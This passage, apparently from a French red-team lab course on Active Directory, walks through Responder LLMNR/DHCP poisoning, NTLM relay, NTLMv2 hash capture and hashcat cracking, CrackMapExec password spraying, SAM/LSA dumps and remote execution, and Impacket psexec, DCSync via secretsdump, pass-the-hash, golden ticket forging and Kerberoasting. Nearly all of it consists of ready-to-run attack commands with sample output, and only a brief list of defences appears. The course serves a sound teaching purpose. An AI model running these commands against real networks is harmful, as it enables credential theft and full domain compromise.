# ─── Le mode socks permet de réutiliser la session relayée ───────────────────
impacket-ntlmrelayx -tf exports/smb-relay-targets.txt -smb2support -socks

# Lorsqu'une capture est relayée, vous verrez :
# [*] SMBD-Thread-5: Connection from SDV-M2/JDOE controlled.

# Utiliser la session socks avec CrackMapExec :
proxychains crackmapexec smb 192.168.1.30 -u jdoe -H <HASH> -x whoami
```

### 4.8 Modes avancés

#### Mode analyse (-A)

```bash
# ─── Analyse uniquement (ne répond pas, écoute juste) ─────────────────────────
# Utile pour cartographier les hôtes sans alerter
sudo python3 /opt/Responder/Responder.py -I eth0 -A -v
```

#### RunFinger (Fingerprint)

```bash
# ─── Outil de fingerprint des hôtes ───────────────────────────────────────────
python3 /opt/Responder/tools/RunFinger.py -i 192.168.1.0/24

# Sortie :
# [192.168.1.10] Windows Server 2022 - DC
# [192.168.1.20] Windows 10 Pro - Workstation
# [192.168.1.30] Windows Server 2019 - SQL Server
```

#### DHCP Poisoning

```bash
# ─── Empoisonnement DHCP ─────────────────────────────────────────────────────
sudo python3 /opt/Responder/Responder.py -I eth0 -d -w -v

# ⚠️ Mode très agressif ! Peut causer des dénis de service.
```

### 4.9 TP Guidé — Capture de hash NTLMv2

#### Contexte

Vous êtes sur le même réseau local que la cible (segment 192.168.1.0/24). Vous devez capturer les hashs NTLMv2 des utilisateurs du domaine.

#### Étape 1 : Vérification de l'interface réseau

```bash
# ─── Lister les interfaces réseau ─────────────────────────────────────────────
ip addr show | grep -E "^[0-9]|inet "
# ou
ifconfig

# ─── Vérifier que vous êtes sur le bon réseau ─────────────────────────────────
arp-scan --localnet
# ou
nmap -sn 192.168.1.0/24
```

#### Étape 2 : Lancement de Responder

```bash
# ─── Lancer Responder sur l'interface du réseau local ─────────────────────────
sudo python3 /opt/Responder/Responder.py -I eth0 -w -v

# ─── Ce que vous devez voir ───────────────────────────────────────────────────
# [+] Starting...
# [NBT-NS] Poisoning...
# [LLMNR] Poisoning...
# [MDNS] Poisoning...
# [HTTP] Server...
# [HTTPS] Server...
# [WPAD] Server...
# [SMB] Server...
# [SQL] Server...
# [FTP] Server...
# [IMAP] Server...
# [POP3] Server...
# [LDAP] Server...
# [DNS] Server...
# [+] Listening for events...
```

#### Étape 3 : Simulation d'une attaque (depuis une machine Windows du lab)

Depuis une machine Windows du domaine (ex: poste utilisateur 192.168.1.20) :

```powershell
# ─── Sur la machine cible Windows ────────────────────────────────────────────

# Simuler une faute de frappe dans le chemin UNC :
net use \\FILESERVER\partage

# OU via l'explorateur : taper \\FILESERVER dans la barre d'adresse
# OU via PowerShell :
Start-Process explorer "\\FILESERVER"
```

#### Étape 4 : Observation de la capture

```bash
# ─── Sur votre Kali, Responder affiche : ──────────────────────────────────────
[*] [LLMNR] Poisoned answer sent to 192.168.1.20 for name FILESERVER
[HTTP] NTLMv2 Client   : 192.168.1.20
[HTTP] NTLMv2 Username : SDV-M2\jdoe
[HTTP] NTLMv2 Hash     : jdoe::SDV-M2:1122334455667788:2C9F3B8F0F0B1A...

# Responder a écrit le hash dans un fichier log :
# logs/SMB-NTLMv2-192.168.1.20.txt
```

#### Étape 5 : Récupération et craquage du hash

```bash
# ─── Lister les logs capturés ─────────────────────────────────────────────────
ls -la /opt/Responder/logs/
# ou
ls -la /usr/share/responder/logs/

# ─── Récupérer le hash ───────────────────────────────────────────────────────
cat /opt/Responder/logs/SMB-NTLMv2-192.168.1.20.txt

# ─── Sauvegarder le hash dans un fichier dédié ────────────────────────────────
mkdir -p exports/hashes
cp /opt/Responder/logs/SMB-NTLMv2-192.168.1.20.txt exports/hashes/responder-hash.txt

# ─── Vérifier le nombre de hashs capturés ────────────────────────────────────
wc -l exports/hashes/responder-hash.txt

# ─── Craquage avec Hashcat et RockYou ─────────────────────────────────────────
hashcat -m 5600 exports/hashes/responder-hash.txt \
  /usr/share/wordlists/rockyou.txt \
  --force -O -w 3

# Options :
#   -m 5600 : mode NTLMv2
#   -O      : optimisation (mode de performance)
#   -w 3    : workload profile (3 = haute performance)

# ─── Si le mot de passe est trouvé ────────────────────────────────────────────
hashcat -m 5600 --show exports/hashes/responder-hash.txt
# Sortie : jdoe::SDV-M2:...:P@ssw0rd
```

#### Étape 6 : Défenses

```bash
# ─── Vérifier si LLMNR est actif sur le réseau ───────────────────────────────
sudo python3 /opt/Responder/Responder.py -I eth0 -A -v

# ─── Comment les équipes bleues se protègent ──────────────────────────────────
# 1. Désactiver LLMNR via GPO
# 2. Désactiver NetBIOS via GPO
# 3. Activer SMB Signing sur tous les serveurs
# 4. Activer SMB Encryption (Windows Server 2022+)
# 5. Segmentation réseau stricte (VLANs)
# 6. Honeytokens Responder : faux chemins UNC

# ─── Contournement : même avec LLMNR désactivé ───────────────────────────────
# Responder capture toujours via :
#   - MDNS (MultiCast DNS)
#   - DHCP poisoning
#   - WPAD (proxy auto-detect)
#   - IPv6 (mitm6)
```

---

## 5. CrackMapExec

### 5.1 Présentation

**CrackMapExec** (CME) est un outil post-exploitation qui permet d'énumérer et d'exploiter des environnements AD à grande échelle. Il intègre des modules pour SMB, LDAP, MSSQL, SSH, WinRM.

**Technique MITRE ATT&CK : T1049 — System Network Connections Discovery / T1087 — Account Discovery**

**Fonctionnalités principales :**
- Énumération des partages SMB (net share)
- Énumération des utilisateurs, groupes, sessions
- Énumération du système d'exploitation
- Exécution de commandes à distance (exec)
- Dump SAM / LSA secrets
- Énumération LDAP
- BloodHound integration (module bhd)
- Pass-the-Hash / Pass-the-Ticket

### 5.2 Installation

```bash
# ─── Installation via pip ─────────────────────────────────────────────────────
pip install crackmapexec

# ─── Vérification ─────────────────────────────────────────────────────────────
crackmapexec --version
# Sortie : CrackMapExec v6.0.0 (ou version supérieure)

# ─── Structure des dossiers ───────────────────────────────────────────────────
ls ~/.cme/
# cme.db       ← Base de données des résultats
# workspace/   ← Workspaces pour organiser les engagements
# logs/        ← Logs des exécutions
```

```bash
# ─── Installation des dépendances additionnelles ──────────────────────────────
pip install ldap3    # Pour le module LDAP
pip install pymssql   # Pour le module MSSQL
pip install bloodhound # Pour BloodHound intégré

# ─── Installation via apt (Kali) ──────────────────────────────────────────────
sudo apt update && sudo apt install -y crackmapexec
```

### 5.3 Syntaxe générale

```bash
# ─── Syntaxe générale de CrackMapExec ─────────────────────────────────────────
crackmapexec <protocol> <target(s)> [options]

# Protocoles disponibles :
#   smb     : SMB (partages, SAM, sessions, exécution)
#   ldap    : requêtes LDAP
#   mssql   : Microsoft SQL Server
#   ssh     : connexion SSH
#   winrm   : WinRM (Windows Remote Management)

# Cibles :
#   - Adresse IP unique : 192.168.1.10
#   - Plage CIDR : 192.168.1.0/24
#   - Fichier de cibles : target-list.txt
#   - Hostname : dc01.sdv-m2.lab
```

### 5.4 Module SMB

#### Énumération de base

```bash
# ─── 1. Énumération des hôtes SMB ─────────────────────────────────────────────
# Liste les hôtes avec SMB ouvert, avec leur OS et version
crackmapexec smb 192.168.1.10

# ─── 2. Avec authentification (utilisateur + mot de passe) ────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd'

# ─── 3. Avec authentification (utilisateur + hash NTLM) ───────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -H 'NTHASH:'

# ─── 4. Sur plusieurs cibles ──────────────────────────────────────────────────
crackmapexec smb 192.168.1.0/24 -u jdoe -p 'P@ssw0rd'

# ─── 5. Avec liste d'utilisateurs (bruteforce / spraying) ─────────────────────
crackmapexec smb 192.168.1.10 -u users.txt -p 'P@ssw0rd'

# ─── 6. Avec liste de mots de passe (spraying) ────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p passwords.txt

# ─── 7. Avec liste d'utilisateurs ET de mots de passe ─────────────────────────
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt --continue-on-success
```

**Sortie typique :**
```
SMB         192.168.1.10   445    DC01     [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:sdv-m2.lab) (signing:True) (SMBv1:False)
SMB         192.168.1.10   445    DC01     [+] sdv-m2.lab\jdoe:P@ssw0rd (admin)
```

**Colonnes de la sortie :**
| Colonne | Description |
|---------|-------------|
| `SMB` | Protocole |
| `192.168.1.10` | Adresse IP |
| `445` | Port SMB |
| `DC01` | Nom NetBIOS de l'hôte |
| `[*]` / `[+]` / `[-]` | Statut : info / succès / échec |
| `Windows 10.0...` | OS + version (énumération) |
| `signing:True/False` | Signature SMB activée ou non |
| `SMBv1:True/False` | SMBv1 activé ou non |

L'indicateur `(admin)` signifie que l'utilisateur a les droits administrateur sur la machine distante.

#### Énumération des partages SMB

```bash
# ─── Lister les partages SMB ──────────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --shares

# Sortie attendue :
# SMB         192.168.1.10   445    DC01     Share           Permissions     Remark
# SMB         192.168.1.10   445    DC01     -----           -----------     ------
# SMB         192.168.1.10   445    DC01     ADMIN$          READ            Remote Admin
# SMB         192.168.1.10   445    DC01     C$              READ,WRITE      Default share
# SMB         192.168.1.10   445    DC01     IPC$            READ            Remote IPC
# SMB         192.168.1.10   445    DC01     NETLOGON        READ            Logon server share
# SMB         192.168.1.10   445    DC01     SYSVOL          READ            Logon server share
# SMB         192.168.1.10   445    DC01     Documents       READ,WRITE      Partage des Documents

# ─── Monter SYSVOL en local pour inspection ──────────────────────────────────
sudo mount -t cifs //192.168.1.10/SYSVOL /mnt/sysvol \
  -o username=jdoe,password='P@ssw0rd',domain=sdv-m2.lab,vers=2.0

find /mnt/sysvol -name "*.bat" -o -name "*.ps1" -o -name "*.vbs" 2>/dev/null
grep -r -i "password\|passwd\|pwd\|secret" /mnt/sysvol/ --include="*.bat" --include="*.ps1" 2>/dev/null

sudo umount /mnt/sysvol
```

#### Énumération des utilisateurs et groupes

```bash
# ─── Lister les utilisateurs du domaine ───────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --users

# ─── Lister les groupes du domaine ────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --groups

# ─── Lister les sessions actives ──────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --sessions

# ─── Lister les admins locaux de la machine ────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --local-auth --users
```

#### Exécution de commandes à distance

```bash
# ─── Exécuter une commande sur la cible (via SMB exec) ────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' -x whoami

# Sortie :
# SMB         192.168.1.10   445    DC01     nt authority\system

# ─── Exécuter avec des arguments complexes ────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' -x 'net user /domain'

# ─── Exécuter un fichier PowerShell ───────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' -X 'Get-Process | Select-Object Name,CPU'

# ─── Exécuter sur plusieurs cibles ────────────────────────────────────────────
crackmapexec smb 192.168.1.10 192.168.1.20 -u jdoe -p 'P@ssw0rd' -x ipconfig
```

#### Dump SAM

```bash
# ─── Dump du SAM (hashs locaux) ───────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --sam

# Sortie :
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::

# ─── Dump des LSA Secrets ─────────────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --lsa

# ─── Dump des secrets DPAPI ────────────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --dpapi
```

#### Password Spraying

```bash
# ─── Spraying : tester un mot de passe contre plusieurs utilisateurs ──────────
crackmapexec smb 192.168.1.10 -u exports/users.txt -p 'Spring2025!' \
  --continue-on-success | grep '[+]'

# ⚠️ Attention au lockout policy :
#   - Par défaut, 5 tentatives invalides → verrouillage (30 min)
#   - Espacer les tentatives (1 minute entre chaque)
#   - Utiliser --no-bruteforce si on teste des couples connus

# ─── Avec délai entre chaque tentative ─────────────────────────────────────────
for user in $(cat exports/users.txt); do
  crackmapexec smb 192.168.1.10 -u "$user" -p 'Spring2025!'
  sleep 30
done

# ─── Vérifier le lockout policy ───────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --pass-pol
```

#### Génération d'une liste de relais SMB

```bash
# ─── Détection des machines sans signature SMB ────────────────────────────────
crackmapexec smb 192.168.1.0/24 --gen-relay-list exports/smb-relay-targets.txt
cat exports/smb-relay-targets.txt
# 192.168.1.20
# 192.168.1.30
```

### 5.5 Module LDAP

```bash
# ─── Énumération LDAP avec CME ────────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd'

# ─── Lister tous les utilisateurs ─────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --users

# ─── Lister tous les groupes ──────────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --groups

# ─── Dump complet du domaine ──────────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --dump

# ─── Comptes AS-REP Roastable ─────────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --asreproast exports/asrep-hashes.txt

# ─── Comptes Kerberoastable ──────────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --kerberoast exports/kerberoast-hashes.txt

# ─── Comptes administrés (adminCount=1) ───────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --admin-count

# ─── Relation de confiance ────────────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --trusted-for-delegation
```

### 5.6 Module MSSQL

```bash
# ─── Énumération des serveurs MSSQL ───────────────────────────────────────────
crackmapexec mssql 192.168.1.30 -u jdoe -p 'P@ssw0rd'

# ─── Exécution de requêtes SQL ────────────────────────────────────────────────
crackmapexec mssql 192.168.1.30 -u jdoe -p 'P@ssw0rd' -q 'SELECT @@version'

# ─── Exécution de commandes OS via xp_cmdshell ─────────────────────────────────
crackmapexec mssql 192.168.1.30 -u jdoe -p 'P@ssw0rd' -x whoami

# ─── Activer xp_cmdshell (si désactivé) ───────────────────────────────────────
crackmapexec mssql 192.168.1.30 -u jdoe -p 'P@ssw0rd' --enable-xp-cmdshell
```

### 5.7 Module SSH

```bash
# ─── Connexion SSH ────────────────────────────────────────────────────────────
crackmapexec ssh 192.168.1.40 -u 'root' -p 't00r' -x id

# ─── Bruteforce SSH ───────────────────────────────────────────────────────────
crackmapexec ssh 192.168.1.40 -u users.txt -p passwords.txt
```

### 5.8 Module WinRM

```bash
# ─── Connexion WinRM ──────────────────────────────────────────────────────────
crackmapexec winrm 192.168.1.10 -u jdoe -p 'P@ssw0rd'

# ─── Exécution de commandes via WinRM ─────────────────────────────────────────
crackmapexec winrm 192.168.1.10 -u jdoe -p 'P@ssw0rd' -x whoami

# ─── WinRM avec PowerShell ────────────────────────────────────────────────────
crackmapexec winrm 192.168.1.10 -u jdoe -p 'P@ssw0rd' -X 'Get-Service'
```

### 5.9 Base de données CME

Tous les résultats sont stockés dans une base SQLite :

```bash
# ─── Interroger la base de données ────────────────────────────────────────────
sqlite3 ~/.cme/cme.db

.tables
# Tables :
# hosts           ← Hôtes scannés
# credentials     ← Identifiants découverts
# shares          ← Partages SMB
# users           ← Utilisateurs
# groups          ← Groupes
# outcomes        ← Résultats de commandes

# ─── Voir tous les hôtes découverts ───────────────────────────────────────────
SELECT * FROM hosts;

# ─── Voir les credentials ─────────────────────────────────────────────────────
SELECT * FROM credentials;

.quit
```

### 5.10 TP Guidé — Énumération AD avec CME

#### Contexte

Vous avez les identifiants `jdoe:P@ssw0rd` sur le domaine `sdv-m2.lab`. Utilisez CrackMapExec pour cartographier le domaine.

#### Étape 1 : Énumération des hôtes SMB

```bash
# ─── Scanner le réseau SMB ────────────────────────────────────────────────────
crackmapexec smb 192.168.1.0/24

# Sortie attendue :
# SMB   192.168.1.10  445  DC01     [*] Windows 10.0 Build 20348 x64 (name:DC01) (signing:True)
# SMB   192.168.1.20  445  WS01     [*] Windows 10.0 Build 19041 x64 (name:WS01) (signing:False)
# SMB   192.168.1.30  445  SQL01    [*] Windows 10.0 Build 17763 x64 (name:SQL01) (signing:False)
```

#### Étape 2 : Test d'authentification

```bash
# ─── Tester les identifiants sur chaque hôte ──────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd'

# Si (admin) apparaît → droits administrateur
# SMB   192.168.1.10  445  DC01     [+] sdv-m2.lab\jdoe:P@ssw0rd (admin)
```

#### Étape 3 : Énumération des partages

```bash
# ─── Lister les partages SMB du DC ────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --shares

# ─── Inspecter SYSVOL pour des secrets ────────────────────────────────────────
sudo mount -t cifs //192.168.1.10/SYSVOL /mnt/sysvol \
  -o username=jdoe,password='P@ssw0rd',domain=sdv-m2.lab,vers=2.0

find /mnt/sysvol -name "*.bat" -o -name "*.ps1" 2>/dev/null
grep -r -i "password\|passwd\|pwd\|secret" /mnt/sysvol/ --include="*.bat" --include="*.ps1" 2>/dev/null

sudo umount /mnt/sysvol
```

#### Étape 4 : Énumération utilisateurs

```bash
# ─── Utilisateurs du domaine ─────────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --users
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --groups
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --sessions
```

#### Étape 5 : Dump SAM (si admin)

```bash
# ─── Dump SAM du DC ───────────────────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --sam

# ─── Sauvegarder les hashs ────────────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --sam 2>&1 | grep ':' >> exports/hashes/sam-hashes.txt
```

#### Étape 6 : Énumération LDAP via CME

```bash
# ─── Requêtes LDAP ────────────────────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --users
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --groups
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --kerberoast exports/hashes/kerberoast-hashes.txt
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --asreproast exports/hashes/asrep-hashes.txt
```

#### Étape 7 : Génération de la liste de relais

```bash
# ─── Machines sans signature SMB (pour relay) ─────────────────────────────────
crackmapexec smb 192.168.1.0/24 --gen-relay-list exports/smb-relay-targets.txt
cat exports/smb-relay-targets.txt
```

---

## 6. Impacket

### 6.1 Présentation

**Impacket** est une collection d'outils Python pour interagir avec les protocoles réseau. Développé par SecureAuth, c'est **la** suite incontournable pour la post-exploitation Windows.

**Techniques MITRE ATT&CK :**
- T1049 — System Network Connections Discovery
- T1003 — OS Credential Dumping
- T1558 — Steal or Forge Kerberos Tickets

**Outils principaux pour le Red Team :**

| Outil | Usage | Port |
|-------|-------|------|
| `psexec.py` | Exécution distante via SMB | 445 |
| `wmiexec.py` | Exécution distante via WMI (RPC) | 135 |
| `smbexec.py` | Exécution distante via SMB (sans fichier) | 445 |
| `dcomexec.py` | Exécution distante via DCOM | 135 |
| `secretsdump.py` | Extraction de hashs SAM/LSA/NTDS | 445 |
| `GetADUsers.py` | Énumération utilisateurs AD | 389 |
| `GetNPUsers.py` | TGS-REQ sans pré-auth (AS-REP Roast) | 88 |
| `GetUserSPNs.py` | Demande de TGS avec SPN (Kerberoast) | 88 |
| `ticketer.py` | Forge de tickets (Golden/Silver) | — |
| `ticketConverter.py` | Conversion .kirbi ↔ .ccache | — |
| `ntlmrelayx.py` | Relais NTLM | 445 |
| `rpcdump.py` | Énumération des endpoints RPC | 135 |
| `lookupsid.py` | Bruteforce SID via RPC | 445 |

### 6.2 Installation

```bash
# ─── Installation via pip (recommandé) ────────────────────────────────────────
pip install impacket

# ─── Vérification ─────────────────────────────────────────────────────────────
impacket-smbclient --help

# ─── Installation via apt (Kali) ──────────────────────────────────────────────
sudo apt update && sudo apt install -y impacket-scripts

# ─── Installation depuis les sources (version la plus récente) ───────────────
git clone https://github.com/fortra/impacket /opt/impacket
pip install /opt/impacket/
```

### 6.3 Exécution de commandes à distance

#### psexec.py

`psexec.py` est l'équivalent de `PsExec` de Microsoft Sysinternals. Il copie un service binaire via SMB (partage `ADMIN$`), le démarre, puis le supprime.

```bash
# ─── Syntaxe ──────────────────────────────────────────────────────────────────
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>

# ─── Avec mot de passe ────────────────────────────────────────────────────────
psexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10

# ─── Avec hash NTLM ───────────────────────────────────────────────────────────
psexec.py sdv-m2.lab/jdoe@192.168.1.10 -hashes 'LMHASH:NTHASH'

# ─── En mode silencieux ──────────────────────────────────────────────────────
psexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -silentcommand

# ─── Avec exécution d'une commande spécifique ─────────────────────────────────
psexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 whoami

# ─── Sortie typique ───────────────────────────────────────────────────────────
# Impacket v0.12.0 - Copyright 2023 Fortra
#
# [*] Requesting shares on 192.168.1.10.....
# [*] Found writable share ADMIN$
# [*] Uploading file nFnbQsKk.exe
# [*] Opening SVCManager on 192.168.1.10.....
# [*] Creating service qxYVmOHz on 192.168.1.10.....
# [*] Starting service qxYVmOHz.....
# [!] Press help for extra shell commands
# C:\Windows\system32>
```

**⚠️ Limitations de psexec.py :**
- Nécessite des droits **administrateur** sur la cible
- Laisse des traces dans les logs (Event ID 7045, 7036)
- Copie un binaire sur le disque → détectable par AV/EDR
- Les partages ADMIN$ doivent être accessibles

#### wmiexec.py

`wmiexec.py` utilise WMI (Windows Management Instrumentation) via RPC (port 135) pour exécuter des commandes. **Plus discret que psexec.py** car :
- Pas de copie de binaire sur le disque
- Pas de création de service
- Utilise les mécanismes standards WMI

```bash
# ─── Syntaxe ──────────────────────────────────────────────────────────────────
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>

# ─── Avec mot de passe ────────────────────────────────────────────────────────
wmiexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10

# ─── Avec hash NTLM ───────────────────────────────────────────────────────────
wmiexec.py sdv-m2.lab/jdoe@192.168.1.10 -hashes 'NTHASH'

# ─── Exécution d'une commande unique ─────────────────────────────────────────
wmiexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 'ipconfig /all'
```

**Logs générés :**
- Event ID 4688 (Process Creation)
- Event ID 4624 (Logon Type 3)
- WMI-Activity logs (Event ID 5857, 5858, 5859)

#### smbexec.py

```bash
# ─── Syntaxe ──────────────────────────────────────────────────────────────────
smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>

# ─── Avec mot de passe ────────────────────────────────────────────────────────
smbexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10

# ─── Avec hash NTLM ───────────────────────────────────────────────────────────
smbexec.py sdv-m2.lab/jdoe@192.168.1.10 -hashes 'LMHASH:NTHASH'
```

#### dcomexec.py

```bash
# ─── Syntaxe ──────────────────────────────────────────────────────────────────
dcomexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>

# ─── Avec ShellBrowserWindow (MMC) : discret ─────────────────────────────────
dcomexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -object MMC20

# ─── Avec ShellWindows ───────────────────────────────────────────────────────
dcomexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -object ShellWindows

# ─── Avec Excel (si Excel est installé) ───────────────────────────────────────
dcomexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -object ExcelDDE
```

**Comparaison des méthodes d'exécution :**

| Outil | Port(s) | Binaire disque | Service créé | Logs | Détection EDR |
|-------|---------|----------------|--------------|------|---------------|
| `psexec.py` | 445 | Oui | Oui | Nombreux | Haute |
| `wmiexec.py` | 135, 445 | Non | Non | Modérés | Moyenne |
| `smbexec.py` | 445 | Non | Oui (temp.) | Modérés | Moyenne |
| `dcomexec.py` | 135 | Non | Non | Variables | Faible |

### 6.4 Extraction de hashs (secretsdump.py)

`secretsdump.py` est **l'outil le plus critique** de la suite Impacket. Il permet d'extraire :
- **SAM** : hashs des comptes locaux
- **LSA Secrets** : secrets stockés dans LSA
- **NTDS.dit** : base de données AD (hashs de TOUS les utilisateurs du domaine)
- **DC Sync** : réplication des hashs depuis un DC

#### Dump SAM

```bash
# ─── Extraction des hashs SAM (comptes locaux) ────────────────────────────────
# Nécessite : droits administrateur sur la cible
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -sam

# Sortie type :
# [*] Dumping local SAM entries (admin on target)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
```

#### Dump LSA Secrets

```bash
# ─── Extraction des LSA Secrets ───────────────────────────────────────────────
# Contient : mots de passe des services, cache de domaine
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -lsa

# Sortie type :
# [*] Dumping LSA Secrets (admin on target)
# $MACHINE.ACC: ...
# DefaultPassword: (si stocké)
# NL$KM: ... (clé pour déchiffrer les hashs du cache)
```

#### Dump NTDS.dit (DCSync) — L'essentiel

```bash
# ─── Extractions des hashs du domaine (NTDS.dit) VIA DCSync ──────────────────
# Méthode 1 : DCSync (plus discret, pas d'accès fichier)
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -just-dc

# Sortie type (extrait) :
# [*] Dumping Domain Credentials (domain:sdv-m2.lab)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# jdoe:1105:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::

# Méthode 2 : DCSync avec export vers fichier
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -just-dc -outputfile exports/dcsync-export

# Génère :
# exports/dcsync-export.ntds   → Hashs NT
# exports/dcsync-export.ntds.cleartext → Si hist de mots de passe

# Méthode 3 : DCSync seulement utilisateurs spécifiques (hashs NT uniquement)
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -just-dc-ntlm

# Méthode 4 : Extraction NTDS.dit + SYSTEM hive (nécessite accès disque)
secretsdump.py -ntds /mnt/ntds/ntds.dit -system /mnt/ntds/system.hive LOCAL
```

**Format des hashs extraits :**

```
username:RID:LM_HASH:NT_HASH:::
│         │   │       │
│         │   │       └── NT Hash (MD4 du mot de passe)
│         │   └── LM Hash (souvent aad3b... = vide)
│         └── Relative ID (identifiant unique)
└── Nom d'utilisateur
```

**Utilisation des hashs extraits :**

```bash
# ─── Pass-the-Hash avec les hashs récupérés ───────────────────────────────────
# Connexion avec le hash NT (sans mot de passe) :
crackmapexec smb 192.168.1.10 -u Administrator -H 'NTHASH'
psexec.py sdv-m2.lab/Administrator@192.168.1.10 -hashes ':NTHASH'
wmiexec.py sdv-m2.lab/Administrator@192.168.1.10 -hashes ':NTHASH'

# ─── Craquage offline des hashs NT ──────────────────────────────────────────
# Mode hashcat pour NTLM = 1000
hashcat -m 1000 exports/dcsync-export.ntds /usr/share/wordlists/rockyou.txt

# ─── Forge d'un Golden Ticket avec le hash KRBTGT ───────────────────────────
# Le hash du compte krbtgt permet de forger n'importe quel ticket
impacket-ticketer -nthash 'KRBTGT_NTHASH' -domain-sid 'DOMAIN_SID' \
  -domain sdv-m2.lab Administrator

# ─── Utilisation du Golden Ticket ───────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache
psexec.py -k sdv-m2.lab/Administrator@dc01.sdv-m2.lab -no-pass
```

### 6.5 Kerberoasting (GetUserSPNs.py)

Le **Kerberoasting** est une technique qui consiste à demander un TGS (Ticket-Granting Service) pour un compte de service ayant un SPN, puis à extraire le hash du ticket pour le craquer offline.

```bash
# ─── Énumération des comptes SPN ──────────────────────────────────────────────
# Lister tous les comptes avec un SPN (Kerberoastable)
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10

# Sortie attendue :
# ServicePrincipalName                    Name       MemberOf
# --------------------------------------  ---------  ---------
# MSSQLSvc/sql01.sdv-m2.lab:1433         svc_sql    Domain Admins
# HTTP/webapp.sdv-m2.lab                 svc_http   Domain Users

# ─── Demande de TGS et extraction du hash ─────────────────────────────────────
# Le hash extrait est craquable offline
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request

# Sortie :
# Impacket v0.12.0 - Copyright 2023 Fortra
#
